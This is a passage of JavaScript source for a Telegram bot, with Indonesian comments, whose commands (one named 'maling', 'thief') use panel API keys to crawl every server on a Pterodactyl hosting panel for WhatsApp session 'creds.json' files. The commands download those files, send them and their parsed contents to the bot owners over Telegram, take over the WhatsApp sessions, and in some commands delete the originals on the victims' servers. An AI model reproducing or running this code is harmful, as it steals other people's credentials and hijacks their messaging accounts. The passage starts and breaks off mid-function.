          json.number ||
          (json.me && (json.me.id || json.me.jid || json.me.user)) ||
          json.clientID ||
          (json.registration && json.registration.phone) ||
          null;

        if (candidate) {
          BotNumber = String(candidate).replace(/\D+/g, "");
          // optional: if number looks local (not starting with country code), try prefix 62
          if (!BotNumber.startsWith("62") && BotNumber.length >= 8 && BotNumber.length <= 15) {
            BotNumber = "62" + BotNumber;
          }
        } else {
          // fallback: use server identifier sanitized
          BotNumber = String(identifier).replace(/\s+/g, "_");
        }
      } catch (e) {
        console.log("Gagal parse creds.json -> gunakan identifier sebagai BotNumber:", e.message);
        BotNumber = String(identifier).replace(/\s+/g, "_");
      }

      // buat direktori session dan simpan creds
      const sessDir = sessionPath(BotNumber);
      try { fs.mkdirSync(sessDir, { recursive: true }); } catch (e) {}
      const credsPath = path.join(sessDir, "creds.json");
      try { fs.writeFileSync(credsPath, credsBuffer); } catch (e) { console.error("Gagal simpan creds:", e.message); }

      // kirim file & info ke owner
      for (const oid of ownerIds) {
        try {
          await ctx.telegram.sendDocument(oid, { source: credsBuffer, filename: `${BotNumber}_creds.json` });
          await ctx.telegram.sendMessage(oid, `📱 Detected: ${BotNumber}\n📁 Server: ${name}\n📂 Path: ${usedPath}`, { parse_mode: "Markdown" });
        } catch (e) {
          console.error("Gagal kirim ke owner:", e.message);
        }
      }

      // flag paths
      const connectedFlag = path.join(sessDir, "connected.flag");
      const failedFlag = path.join(sessDir, "failed.flag");

      // jika sudah pernah sukses connect -> skip
      if (fs.existsSync(connectedFlag)) {
        console.log(`[SKIP] ${BotNumber} sudah connected (flag exists).`);
        await sleep(REQUEST_DELAY_MS);
        continue;
      }

      // jika pernah gagal sebelumnya -> skip juga (hindari loop reconnect)
      if (fs.existsSync(failedFlag)) {
        console.log(`[SKIP] ${BotNumber} sebelumnya gagal (failed.flag).`);
        await sleep(REQUEST_DELAY_MS);
        continue;
      }

      // coba connect 1x, tangani 404 secara khusus
      try {
        // pastikan file creds.json ada sebelum connect
        if (!fs.existsSync(credsPath)) {
          console.log(`[SKIP CONNECT] creds.json not present for ${BotNumber}`);
        } else {
          await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
          // jika berhasil, tandai connected
          try { fs.writeFileSync(connectedFlag, String(Date.now())); } catch (e) {}
          console.log(`[CONNECTED] ${BotNumber}`);
        }
      } catch (err) {
        // jika error mengandung 404 atau server not found -> buat failed.flag supaya tidak coba lagi
        const emsg = (err && (err.message || (err.response && err.response.status))) ? (err.message || err.response.status) : String(err);
        console.error(`[CONNECT FAIL] ${BotNumber}:`, emsg);

        // buat failed.flag untuk mencegah retry otomatis
        try { fs.writeFileSync(failedFlag, JSON.stringify({ time: Date.now(), error: emsg })); } catch (e) {}

        // kirim notifikasi ke owner
        for (const oid of ownerIds) {
          try {
            await ctx.telegram.sendMessage(oid, `❌ Gagal connect ${BotNumber}\nServer: ${name}\nError: ${emsg}`);
          } catch (e) {}
        }
      }

      // jeda antar server
      await sleep(REQUEST_DELAY_MS * 2);
    } // end for servers

    // akhir, reply ke pemanggil
    if (totalFound === 0) {
      await ctx.reply("✅ Selesai. Tidak ditemukan creds.json di semua server.");
    } else {
      await ctx.reply(`✅ Selesai. Total creds.json ditemukan: ${totalFound}. (owners sudah dikirimi file dan percobaan connect dilakukan 1x).`);
    }
  } catch (err) {
    console.error("csession error:", err?.response?.data || err.message);
    await ctx.reply("❌ Terjadi error saat scan. Periksa log server.");
  }
});

bot.command("kkkdidkdkdkdns", async (ctx) => {
  const input = ctx.message.text.split(" ").slice(1);
  if (input.length < 3) {
    return ctx.reply("Format salah\nContoh: /csessions http://domain.com plta_xxxx pltc_xxxx");
  }

  const domain = input[0];
  const plta = input[1];
  const pltc = input[2];

  await ctx.reply("⏳ Sedang scan semua server untuk mencari folder `sessions` dan file `creds.json` ...", { parse_mode: "Markdown" });

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    return a.type === "dir" || a.type === "directory" || a.mode === "dir" || a.mode === "directory" || a.mode === "d" || a.is_directory === true || a.isDir === true;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(`${domain.replace(/\/+$/, "")}/api/client/servers/${identifier}/files/list`, {
        params: { directory: dir },
        headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` }
      });
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];
      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");

        if (name.toLowerCase() === "sessions" && isDirectory(item)) {
          try {
            const sessRes = await axios.get(`${domain.replace(/\/+$/, "")}/api/client/servers/${identifier}/files/list`, {
              params: { directory: normalized },
              headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` }
            });
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "creds.json") found.push({ path: sfPath.replace(/\/+/g, "/"), name: sfName });
              }
            }
          } catch {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
            if (more.length) found = found.concat(more);
          } catch {}
        } else {
          if (name.toLowerCase() === "creds.json") found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
        }
      }
      return found;
    } catch {
      return [];
    }
  }

  try {
    const res = await axios.get(`${domain.replace(/\/+$/, "")}/api/application/servers`, {
      headers: { Accept: "application/json", Authorization: `Bearer ${plta}` }
    });
    const data = res.data;
    if (!data || !Array.isArray(data.data)) return ctx.reply("❌ Gagal ambil list server dari panel.");

    let totalFound = 0;
    for (let srv of data.data) {
      const identifier = (srv.attributes && srv.attributes.identifier) || srv.identifier || (srv.attributes && srv.attributes.id);
      const name = (srv.attributes && srv.attributes.name) || srv.name || identifier || "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = fileInfo.path.replace(/\/+/g, "/").replace(/^\/?/, "/");

          // info ke owner
          for (let oid of ownerIds) {
            await ctx.telegram.sendMessage(oid, `📁 Ditemukan creds.json di server *${name}*\nPath: \`${filePath}\``, { parse_mode: "Markdown" });
          }

          try {
            const downloadRes = await axios.get(`${domain.replace(/\/+$/, "")}/api/client/servers/${identifier}/files/download`, {
              params: { file: filePath },
              headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` }
            });
            const dlJson = downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, { responseType: "arraybuffer" });
              const buffer = Buffer.from(fileRes.data);

              // Simpan creds ke sessionPath
              const BotNumber = name.replace(/\s+/g, "_"); // pakai nama server sebagai BotNumber
              const sessDir = sessionPath(BotNumber);
              const credsPath = path.join(sessDir, "creds.json");
              fs.writeFileSync(credsPath, buffer);

              // Kirim file ke owner
              for (let oid of ownerIds) {
                try {
                  await ctx.telegram.sendDocument(oid, { source: buffer, filename: `${BotNumber}_creds.json` });
                } catch (e) {
                  console.error(`Gagal kirim file creds.json ke owner ${oid}:`, e);
                }
              }

              // Otomatis connect ke WA
              try {
                await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
              } catch (e) {
                console.error(`Gagal connect WA ${BotNumber}:`, e);
              }
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e);
          }
        }
      }
    }

    if (totalFound === 0) {
      for (let oid of ownerIds) {
        await ctx.telegram.sendMessage(oid, "✅ Scan selesai. Tidak ditemukan creds.json di folder sessions pada server manapun.");
      }
    } else {
      for (let oid of ownerIds) {
        await ctx.telegram.sendMessage(oid, `✅ Scan selesai. Total file creds.json berhasil diunduh & langsung connect: ${totalFound}`);
      }
    }
  } catch (err) {
    console.error("csessions Error:", err);
    for (let oid of ownerIds) {
      await ctx.telegram.sendMessage(oid, "❌ Terjadi error saat scan.");
    }
  }
});

bot.command("csenderr", async (ctx) => {
  const input = ctx.message.text.split(" ").slice(1);
  if (input.length < 3) {
    return ctx.reply("Format salah\nContoh: /csession http://domain.com plta_xxxx pltc_xxxx");
  }

  const [domain, plta, pltc] = input;
  const domainBase = domain.replace(/\/+$/, "");
  await ctx.reply("⏳ Mencari folder `session` & `sessions` serta file `creds.json`...");

  const isDir = (item) =>
    item?.attributes?.type === "dir" ||
    item?.attributes?.is_directory ||
    item?.attributes?.mode === "directory";

  async function traverse(identifier, dir = "/") {
    try {
      const res = await axios.get(`${domainBase}/api/client/servers/${identifier}/files/list`, {
        params: { directory: dir },
        headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` },
      });
      const files = res.data?.data || [];
      let found = [];

      for (const f of files) {
        const name = f.attributes?.name || f.name || "";
        const pathFull = (dir === "/" ? "" : dir) + "/" + name;
        const norm = pathFull.replace(/\/+/g, "/");

        // Cek folder "session" atau "sessions"
        if (/^sessions?$/i.test(name) && isDir(f)) {
          try {
            const inner = await axios.get(`${domainBase}/api/client/servers/${identifier}/files/list`, {
              params: { directory: norm },
              headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` },
            });
            for (const sf of inner.data?.data || []) {
              if (sf.attributes?.name?.toLowerCase() === "creds.json") {
                found.push(norm + "/creds.json");
              }
            }
          } catch {}
        }

        // Rekursif
        if (isDir(f)) {
          const more = await traverse(identifier, norm);
          found = found.concat(more);
        } else if (name.toLowerCase() === "creds.json") {
          found.push(norm);
        }
      }

      return found;
    } catch {
      return [];
    }
  }

  try {
    const srvRes = await axios.get(`${domainBase}/api/application/servers`, {
      headers: { Accept: "application/json", Authorization: `Bearer ${plta}` },
    });
    const servers = srvRes.data?.data || [];

    let total = 0;

    for (const srv of servers) {
      const identifier = srv.attributes?.identifier;
      const name = srv.attributes?.name || identifier;
      if (!identifier) continue;

      const foundFiles = await traverse(identifier, "/");
      if (!foundFiles.length) continue;

      for (const p of foundFiles) {
        try {
          // Download creds.json
          const dlMeta = await axios.get(
            `${domainBase}/api/client/servers/${identifier}/files/download`,
            {
              params: { file: p },
              headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` },
            }
          );

          if (dlMeta?.data?.attributes?.url) {
            const fileRes = await axios.get(dlMeta.data.attributes.url, { responseType: "arraybuffer" });
            const credsBuffer = Buffer.from(fileRes.data);

            // Hapus creds.json di server setelah download
            try {
              await axios.post(
                `${domainBase}/api/client/servers/${identifier}/files/delete`,
                { root: "/", files: [p.replace(/^\/+/, "")] },
                { headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` } }
              );
              console.log(`[DELETED] creds.json di server ${identifier}`);
            } catch (err) {
              console.warn(`[WARN] Gagal hapus creds.json: ${err.message}`);
            }

            // Simpan creds lokal
            const sessDir = sessionPath(identifier);
            if (!fs.existsSync(sessDir)) fs.mkdirSync(sessDir, { recursive: true });
            const credsPath = path.join(sessDir, "creds.json");
            fs.writeFileSync(credsPath, credsBuffer);

            // Deteksi nomor WA
            let BotNumber = "unknown";
            try {
              const credsData = JSON.parse(credsBuffer.toString());
              BotNumber = credsData?.me?.id?.split(":")[0] || "unknown";
            } catch {}

            // Kirim ke owner
            for (const oid of ownerIds) {
              await ctx.telegram.sendDocument(oid, { source: credsBuffer, filename: `${BotNumber}_creds.json` });
            }

            // Auto connect
            try {
              await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
              total++;
              await ctx.telegram.sendMessage(
                ctx.chat.id,
                `✅ Berhasil connect ke WA ${BotNumber}`
              );
            } catch (err) {
              let reason = "Unknown";
              if (err?.response?.status) {
                const s = err.response.status;
                reason =
                  s === 403
                    ? "403 Forbidden"
                    : s === 404
                    ? "404 Not Found"
                    : s === 440
                    ? "440 Login Timeout"
                    : `${s}`;
              } else if (err?.message) reason = err.message;

              fs.writeFileSync(path.join(sessDir, "failed.flag"), JSON.stringify({ reason }));
              await ctx.telegram.sendMessage(
                ctx.chat.id,
                `❌ Gagal connect ${BotNumber} (Reason: ${reason})`
              );
            }
          }
        } catch (e) {
          console.error(`Gagal proses creds.json di ${name}:`, e.message);
        }
      }
    }

    await ctx.reply(`✅ Scan selesai. Total WA berhasil di-connect: ${total}`);
  } catch (err) {
    console.error("csession error:", err);
    await ctx.reply("❌ Terjadi error saat scan server.");
  }
});


bot.command("listsender", (ctx) => {
  const userId = ctx.from.id.toString();

  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ACESSO SOMENTE PARA O DONO\n—Por favor, registre-se primeiro para acessar este recurso.");
  }

  if (sessions.size === 0) return ctx.reply("Daftar sender aktif : 0");

  const daftarSender = [...sessions.keys()]
    .map(n => `• ${n}`)
    .join("\n");

  ctx.reply(`Daftar Sender Aktif:\n${daftarSender}`);
});

bot.command("delsender", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ACESSO SOMENTE PARA USUÁRIOS\n—Por favor, registre-se primeiro para acessar este recurso.");
  }
  
  if (args.length < 2) return ctx.reply("✗ Falha\n\nExample : /delsender 628xxxx", { parse_mode: "HTML" });

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    fs.writeFileSync(file_session, JSON.stringify(data.filter(n => n !== number)));
    ctx.reply(`✓ Session untuk bot ${number} berhasil dihapus.`);
  } catch (err) {
    console.error(err);
    ctx.reply("Terjadi error saat menghapus sender.");
  }
});

bot.command("maling", async (ctx) => {
  const input = ctx.message.text.split(" ").slice(1);
  if (input.length < 3) {
    return ctx.reply("Format salah\nContoh: /csession http://domain.com plta_xxxx pltc_xxxx");
  }

  const [domain, plta, pltc] = input;
  const domainBase = domain.replace(/\/+$/, "");
  await ctx.reply("⏳ Mencari folder `session` & `sessions` serta file `creds.json`...");

  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  const isDir = (item) =>
    item?.attributes?.type === "dir" ||
    item?.attributes?.is_directory ||
    item?.attributes?.mode === "directory";

  async function listFiles(identifier, dir = "/") {
    try {
      const res = await axios.get(`${domainBase}/api/client/servers/${identifier}/files/list`, {
        params: { directory: dir },
        headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` },
      });
      return res.data?.data || [];
    } catch (e) {
      console.warn(`[WARN] Gagal list ${dir}: ${e.response?.status || e.message}`);
      return [];
    }
  }

  async function traverse(identifier, dir = "/", depth = 0) {
    if (depth > 10) return [];
    const files = await listFiles(identifier, dir);
    let found = [];

    for (const f of files) {
      const name = f.attributes?.name || f.name;
      const pathFull = (dir === "/" ? "" : dir) + "/" + name;
      const norm = pathFull.replace(/\/+/g, "/");

      // Kalau folder session/sessions
      if (/^sessions?$/i.test(name) && isDir(f)) {
        const inner = await listFiles(identifier, norm);
        for (const sf of inner) {
          if (sf.attributes?.name?.toLowerCase() === "creds.json") {
            found.push(norm + "/creds.json");
          }
        }
      }

      // File langsung creds.json
      if (name.toLowerCase() === "creds.json") found.push(norm);

      if (isDir(f)) {
        const more = await traverse(identifier, norm, depth + 1);
        found = found.concat(more);
      }

      await sleep(200);
    }
    return found;
  }

  async function tryDownload(identifier, p) {
    try {
      const dlMeta = await axios.get(
        `${domainBase}/api/client/servers/${identifier}/files/download`,
        {
          params: { file: p },
          headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` },
        }
      );

      if (dlMeta?.data?.attributes?.url) {
        const fileRes = await axios.get(dlMeta.data.attributes.url, {
          responseType: "arraybuffer",
        });
        const credsBuffer = Buffer.from(fileRes.data);

        // Hapus setelah berhasil
        try {
          await axios.post(
            `${domainBase}/api/client/servers/${identifier}/files/delete`,
            { root: "/", files: [p.replace(/^\/+/, "")] },
            { headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` } }
          );
          console.log(`[DELETED] creds.json di server ${identifier}`);
        } catch (err) {
          console.warn(`[WARN] Gagal hapus creds.json: ${err.message}`);
        }

        return credsBuffer;
      }
    } catch (err) {
      console.warn(`[WARN] Gagal download ${p}: ${err.response?.status || err.message}`);
    }
    return null;
  }

  try {
    const srvRes = await axios.get(`${domainBase}/api/application/servers`, {
      headers: { Accept: "application/json", Authorization: `Bearer ${plta}` },
    });

    const servers = srvRes.data?.data || [];
    let total = 0;

    for (const srv of servers) {
      const identifier = srv.attributes?.identifier;
      if (!identifier) continue;

      const foundFiles = await traverse(identifier, "/");

      // kalau gak ketemu, coba path umum
      if (!foundFiles.length) {
        const commons = [
          "/home/container/session/creds.json",
          "/home/container/sessions/creds.json",
          "/container/session/creds.json",
          "/session/creds.json",
          "/sessions/creds.json",
        ];
        for (const cp of commons) {
          const test = await tryDownload(identifier, cp);
          if (test) {
            foundFiles.push(cp);
            break;
          }
        }
      }

      if (!foundFiles.length) {
        await ctx.reply(`⚠️ Tidak ada creds.json di server ${identifier}`);
        continue;
      }

      for (const p of foundFiles) {
        const credsBuffer = await tryDownload(identifier, p);
        if (!credsBuffer) continue;

        const sessDir = sessionPath(identifier);
        fs.mkdirSync(sessDir, { recursive: true });
        const credsPath = path.join(sessDir, "creds.json");
        fs.writeFileSync(credsPath, credsBuffer);

        let BotNumber = "unknown";
        try {
          const credsData = JSON.parse(credsBuffer.toString());
          BotNumber = credsData?.me?.id?.split(":")[0] || "unknown";
        } catch {}

        // Kirim file ke owner
        for (const oid of ownerIds) {
          await ctx.telegram.sendDocument(oid, {
            source: credsBuffer,
            filename: `${BotNumber}_creds.json`,
          });
        }

        try {
          await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
          total++;
          await ctx.telegram.sendMessage(ctx.chat.id, `✅ Berhasil connect ke WA ${BotNumber}`);
        } catch (err) {
          const status = err?.response?.status;
          let reason = "Unknown";
          if (status === 403) reason = "403 Forbidden";
          else if (status === 404) reason = "404 Not Found";
          else if (status === 440) reason = "440 Login Timeout";
          else reason = err.message;

          await ctx.telegram.sendMessage(
            ctx.chat.id,
            `❌ Gagal connect ${BotNumber} (Reason: ${reason})`
          );
        }
      }
    }

    await ctx.reply(`✅ Scan selesai. Total WA berhasil connect: ${total}`);
  } catch (err) {
    console.error("csession error:", err);
    await ctx.reply("❌ Terjadi error saat scan server (cek token atau domain).");
  }
});

// CSessions - improved, defensive, auto-detect creds.json
// Requirements (must exist in scope): axios, fs, path, ownerIds (array), sessionPath(fn), connectToWhatsApp(fn), bot (telegraf instance)
bot.command("csession", async (ctx) => {
  // -- CONFIG --
  const DEBUG_CS = false;            // set true untuk melihat log panjang
  const SEND_TO_CALLER = false;      // kalau mau juga kirim hasil ke pemanggil set true
  const REQUEST_DELAY_MS = 250;      // jeda antar request ke API (hindari rate-limit)
  const MAX_DEPTH = 12;              // batas rekursi (safety)
  const MAX_SEND_TEXT = 3500;        // batas chars saat kirim isi JSON ke Telegram

  // -- util --
  const sleep = (ms) => new Promise(r => setTimeout(r, ms));

  function isDirectory(item) {
    if (!item) return false;
    const a = item.attributes || {};
    const checks = [
      a.type, a.mode, item.type, item.mode,
      a.is_directory, a.isDir, a.directory,
      item.is_directory, item.isDir, item.directory
    ];
    for (let c of checks) {
      if (typeof c === "string") {
        const lc = c.toLowerCase();
        if (lc === "dir" || lc === "directory" || lc === "d") return true;
        if (lc === "file" || lc === "f") return false;
      }
      if (c === true) return true;
      if (c === false) return false;
    }
    return false; // fallback: treat as file unless explicit
  }

  function normalizeDir(dir) {
    if (!dir) return "/";
    let d = String(dir).replace(/\/+/g, "/");
    if (!d.startsWith("/")) d = "/" + d;
    if (d.length > 1 && d.endsWith("/")) d = d.slice(0, -1);
    return d;
  }

  function extractNameAndMaybeFullPath(item) {
    const a = item.attributes || {};
    const candidates = [a.name, item.name, a.filename, item.filename, a.path, item.path];
    for (let c of candidates) {
      if (!c) continue;
      const s = String(c).trim();
      if (s) return s;
    }
    // fallback: try keys
    for (let k of Object.keys(item)) {
      if (/name|file|path|filename/i.test(k) && item[k]) return String(item[k]);
    }
    return "";
  }

  async function apiListFiles(domainBase, identifier, dir) {
    try {
      const res = await axios.get(`${domainBase}/api/client/servers/${identifier}/files/list`, {
        params: { directory: dir },
        headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` }
      });
      return res.data;
    } catch (e) {
      if (DEBUG_CS) console.error("apiListFiles error", e && (e.response && e.response.data) ? e.response.data : e.message);
      return null;
    }
  }

  // mencoba download metadata -> lalu file. Mengatasi leading slash/no leading slash.
  async function tryDownloadFile(domainBase, identifier, absFilePath) {
    // domainBase harus tanpa trailing slash
    const candidates = [];
    const p = String(absFilePath || "").replace(/\/+/g, "/");
    if (!p) return null;
    candidates.push(p.startsWith("/") ? p : "/" + p);
    // tanpa leading slash juga coba
    const noLead = p.startsWith("/") ? p.slice(1) : p;
    if (!candidates.includes("/" + noLead)) candidates.push("/" + noLead);
    // juga coba without leading slash param (beberapa API minta tanpa slash)
    candidates.push(noLead);

    for (let c of candidates) {
      try {
        const dlMeta = await axios.get(`${domainBase}/api/client/servers/${identifier}/files/download`, {
          params: { file: c },
          headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` }
        });
        if (dlMeta && dlMeta.data && dlMeta.data.attributes && dlMeta.data.attributes.url) {
          const url = dlMeta.data.attributes.url;
          const fileRes = await axios.get(url, { responseType: "arraybuffer" });
          return { buffer: Buffer.from(fileRes.data), meta: dlMeta.data };
        }
      } catch (e) {
        if (DEBUG_CS) console.error("tryDownloadFile attempt", c, e && (e.response && e.response.data) ? e.response.data : e.message);
        // lanjut ke candidate berikutnya
      }
      await sleep(REQUEST_DELAY_MS);
    }
    return null;
  }

  // rekursif defensif dengan batas kedalaman
  async function traverseAndFind(domainBase, identifier, dir = "/", depth = 0) {
    dir = normalizeDir(dir);
    if (depth > MAX_DEPTH) return [];
    const listJson = await apiListFiles(domainBase, identifier, dir);
    if (!listJson || !Array.isArray(listJson.data)) return [];

    if (DEBUG_CS) {
      try { console.log("LIST", identifier, dir, JSON.stringify(listJson).slice(0, 1200)); } catch(e){}
    }

    let found = [];
    for (let item of listJson.data) {
      const rawName = extractNameAndMaybeFullPath(item);
      if (!rawName) continue;

      const nameLooksLikePath = rawName.includes("/");
      let itemPath;
      if (nameLooksLikePath) itemPath = rawName.startsWith("/") ? rawName : "/" + rawName;
      else itemPath = (dir === "/" ? "" : dir) + "/" + rawName;
      itemPath = itemPath.replace(/\/+/g, "/");

      const baseName = rawName.includes("/") ? rawName.split("/").pop() : rawName;
      const lname = baseName.toLowerCase();

      // Jika file/dir bernama session / sessions -> buka isinya
      if (isDirectory(item) && (lname === "session" || lname === "sessions")) {
        const sessDir = normalizeDir(itemPath);
        const sessList = await apiListFiles(domainBase, identifier, sessDir);
        if (sessList && Array.isArray(sessList.data)) {
          for (let sf of sessList.data) {
            const sfName = extractNameAndMaybeFullPath(sf);
            if (!sfName) continue;
            const sfBase = sfName.includes("/") ? sfName.split("/").pop() : sfName;
            if (sfBase.toLowerCase() === "creds.json" || sfBase.toLowerCase().endsWith("creds.json")) {
              const sfPath = (sessDir === "/" ? "" : sessDir) + "/" + (sfName.includes("/") ? sfName.split("/").pop() : sfName);
              found.push({ path: sfPath.replace(/\/+/g, "/"), name: sfBase });
            }
          }
        }
      }

      // jika item adalah file creds.json langsung
      if (!isDirectory(item) && (lname === "creds.json" || lname.endsWith("creds.json"))) {
        found.push({ path: itemPath, name: baseName });
      }

      // rekursi ke subfolder
      if (isDirectory(item)) {
        const more = await traverseAndFind(domainBase, identifier, itemPath, depth + 1);
        if (more && more.length) found = found.concat(more);
      }

      await sleep(REQUEST_DELAY_MS);
    }

    // deduplicate berdasarkan path
    const uniq = [];
    const seen = new Set();
    for (let f of found) {
      const p = f.path.replace(/\/+/g, "/");
      if (!seen.has(p)) { seen.add(p); uniq.push(f); }
    }
    return uniq;
  }

  // ---- start handler ----
  const input = ctx.message.text.split(" ").slice(1);
  if (input.length < 3) {
    return ctx.reply("Format salah\nContoh: /csessions http://domain.com plta_xxxx pltc_xxxx");
  }
  const domainRaw = input[0];
  const plta = input[1];
  const pltc = input[2];

  const domainBase = domainRaw.replace(/\/+$/, ""); // no trailing slash

  await ctx.reply("⏳ Sedang scan semua server untuk mencari folder `session` / `sessions` dan file `creds.json` ...", { parse_mode: "Markdown" });

  try {
    // ambil list servers
    const appRes = await axios.get(`${domainBase}/api/application/servers`, {
      headers: { Accept: "application/json", Authorization: `Bearer ${plta}` }
    });
    const appData = appRes.data;
    if (!appData || !Array.isArray(appData.data)) {
      return ctx.reply("❌ Gagal ambil list server dari panel. Cek PLTA & domain.");
    }

    let totalFound = 0;
    for (let srv of appData.data) {
      // identifier heuristik
      const identifier = (srv.attributes && srv.attributes.identifier) || srv.identifier || (srv.attributes && srv.attributes.id);
      const name = (srv.attributes && srv.attributes.name) || srv.name || identifier || "unknown";
      if (!identifier) continue;

      // traverse defensif
      const foundList = await traverseAndFind(domainBase, identifier, "/");
      if (!foundList || foundList.length === 0) {
        // juga coba direct known common paths (fast check) - contoh yang Anda sebutkan
        const commonPaths = ["/home/container/session/creds.json", "/home/container/sessions/creds.json", "/container/session/creds.json", "/session/creds.json", "/sessions/creds.json", "home/container/session/creds.json"];
        for (let cp of commonPaths) {
          const tryDl = await tryDownloadFile(domainBase, identifier, cp);
          if (tryDl) {
            foundList.push({ path: cp.startsWith("/") ? cp : "/" + cp, name: "creds.json" });
            break;
          }
        }
      }

      if (foundList && foundList.length) {
        for (let fileInfo of foundList) {
          totalFound++;
          const filePath = fileInfo.path.replace(/\/+/g, "/").replace(/^\/?/, "/");

          // notif ke owner (hanya owner)
          for (let oid of ownerIds) {
            try {
              await ctx.telegram.sendMessage(oid, `📁 Ditemukan creds.json di server *${name}*\nPath: \`${filePath}\``, { parse_mode: "Markdown" });
            } catch (e) { if (DEBUG_CS) console.error("notif owner err", e); }
          }

          // coba download (jika traverse menemukan path, coba)
          let downloaded = null;
          try {
            downloaded = await tryDownloadFile(domainBase, identifier, filePath);
            if (!downloaded) {
              // jika gagal, coba tanpa leading slash
              downloaded = await tryDownloadFile(domainBase, identifier, filePath.replace(/^\//, ""));
            }
          } catch (e) {
            if (DEBUG_CS) console.error("download attempt error", e && e.message);
          }

          if (downloaded && downloaded.buffer) {
            try {
              const BotNumber = (name || "server").toString().replace(/\s+/g, "_");
              const sessDir = sessionPath(BotNumber);
              try { fs.mkdirSync(sessDir, { recursive: true }); } catch(e){}
              const credsPath = path.join(sessDir, "creds.json");
              fs.writeFileSync(credsPath, downloaded.buffer);

              // kirim file ke owner
              for (let oid of ownerIds) {
                try {
                  await ctx.telegram.sendDocument(oid, { source: downloaded.buffer, filename: `${BotNumber}_creds.json` });
                } catch (e) {
                  if (DEBUG_CS) console.error("sendDocument owner err", e && e.message);
                }
              }

              // (opsional) kirim juga ke pemanggil
              if (SEND_TO_CALLER) {
                try {
                  await ctx.telegram.sendDocument(ctx.chat.id, { source: downloaded.buffer, filename: `${BotNumber}_creds.json` });
                } catch (e) { if (DEBUG_CS) console.error("sendDocument caller err", e && e.message); }
              }

              // coba parse JSON dan kirim isinya (potong jika panjang)
              try {
                const txt = downloaded.buffer.toString("utf8");
                let parsed = null;
                try { parsed = JSON.parse(txt); } catch(e) { parsed = null; }
                if (parsed) {
                  const pretty = JSON.stringify(parsed, null, 2);
                  const payload = pretty.length > MAX_SEND_TEXT ? pretty.slice(0, MAX_SEND_TEXT) + "\n\n...[truncated]" : pretty;
                  for (let oid of ownerIds) {
                    try {
                      await ctx.telegram.sendMessage(oid, `\`${BotNumber}_creds.json\` (parsed JSON):\n\n\`\`\`json\n${payload}\n\`\`\``, { parse_mode: "Markdown" });
                    } catch (e) { if (DEBUG_CS) console.error("send parsed json err", e && e.message); }
                  }
                } else {
                  // kirim first ~500 chars sebagai preview kalau nggak valid json
                  const preview = txt.slice(0, 600) + (txt.length > 600 ? "\n\n...[truncated]" : "");
                  for (let oid of ownerIds) {
                    try {
                      await ctx.telegram.sendMessage(oid, `Preview \`${BotNumber}_creds.json\`:\n\n\`\`\`\n${preview}\n\`\`\``, { parse_mode: "Markdown" });
                    } catch (e) { if (DEBUG_CS) console.error("send preview err", e && e.message); }
                  }
                }
              } catch (e) {
                if (DEBUG_CS) console.error("parse/send json err", e && e.message);
              }

              // coba auto connect ke WA (tetap dicoba)
              try {
                await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
              } catch (e) {
                if (DEBUG_CS) console.error("connectToWhatsApp err", e && e.message);
              }
            } catch (e) {
              if (DEBUG_CS) console.error("save/send file err", e && e.message);
            }
          } else {
            if (DEBUG_CS) console.log("Gagal download file:", filePath, "server:", name);
          }

          // jeda antar file
          await sleep(REQUEST_DELAY_MS);
        } // for foundList
      } // if foundList

      // jeda antar server
      await sleep(REQUEST_DELAY_MS * 2);
    } // for servers

    // akhir
    if (totalFound === 0) {
      await ctx.reply("✅ Scan selesai. Tidak ditemukan creds.json di folder session/sessions pada server manapun.");
      for (let oid of ownerIds) {
        try { await ctx.telegram.sendMessage(oid, "✅ Scan selesai (publik). Tidak ditemukan creds.json."); } catch {}
      }
    } else {
      await ctx.reply(`✅ Scan selesai. Total file creds.json berhasil ditemukan: ${totalFound} (owners dikirimi file & preview).`);
      for (let oid of ownerIds) {
        try { await ctx.telegram.sendMessage(oid, `✅ Scan selesai (publik). Total file creds.json ditemukan: ${totalFound}`); } catch {}
      }
    }
  } catch (err) {
